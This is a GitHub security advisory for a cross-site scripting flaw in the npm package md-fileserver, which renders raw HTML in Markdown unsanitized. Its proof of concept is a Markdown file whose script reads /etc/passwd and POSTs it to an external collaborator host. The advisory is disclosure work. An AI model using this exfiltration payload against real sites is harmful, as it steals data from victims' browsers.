# [H] md-fileserver: Stored/Reflected XSS when viewing Markdown (raw HTML allowed)

## Summary
Severity: High
Advisory: GHSA-32q2-hhr5-6qvv
CVE: CVE-2026-46492
CWE: CWE-80, CWE-87
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-21
Source: https://github.com/advisories/GHSA-32q2-hhr5-6qvv
Type: github-advisory

## Affected
- npm: `md-fileserver` — affected >=0 <1.10.3

## Details
### Summary
A cross-site scripting (XSS) vulnerability exists in the application’s Markdown rendering logic. When user-supplied Markdown content is rendered, embedded raw HTML—including <script> tags—is processed and injected into the resulting page without sanitization, allowing arbitrary JavaScript execution in the context of the affected domain.

### Details
An attacker can craft malicious Markdown content containing <script> tags or event handlers (e.g., <img onerror=...>). When this Markdown is viewed or previewed, the embedded JavaScript executes in the victim’s browser.

### Vulnerable Components
config.js → markdownIt: { html: true } (Lines 26–30)
The Markdown renderer is explicitly configured to allow raw HTML.

lib/markd.js (Lines 33–58)
Renders Markdown content without sanitizing HTML, allowing unsafe tags and attributes to remain in the output.

lib/pages/template.html
The rendered Markdown is injected into the HTML template using <%= markdown %> without sanitization or output encoding.

### PoC
Create a pwn.md 
```
# Hello

<script>
  fetch('/etc/passwd', { credentials: 'include' })
    .then(r => r.text())
    .then(t => fetch('https://79evxsw3m08qfyvxluebgl0pyg47szgo.oastify.com/exfil', { method: 'POST', body: t }));
</script>

```
Open it on browser.
<img width="944" height="238" alt="image" src="https://github.com/user-attachments/assets/cd9e1396-9f4b-4a4b-bc2a-d7530c0c00ac" />
View the HTTP request in Burp Collaborator.
<img width="1328" height="468" alt="image" src="https://github.com/user-attachments/assets/9faa65ad-73ec-42d0-9ce3-ea78b15294d8" />


### Impact
Successful exploitation allows an attacker to execute arbitrary JavaScript in the victim’s browser, leading to:
- Session hijacking
- Account takeover
- Credential theft
- Defacement or injection of malicious content
- Exfiltration of sensitive data via API tokens, CSRF tokens, or user information

This affects all users who can view Markdown content within the application.

## References
- https://github.com/commenthol/md-fileserver/security/advisories/GHSA-32q2-hhr5-6qvv
- https://nvd.nist.gov/vuln/detail/CVE-2026-46492
- https://github.com/commenthol/md-fileserver
- https://github.com/commenthol/md-fileserver/releases/tag/v1.10.3
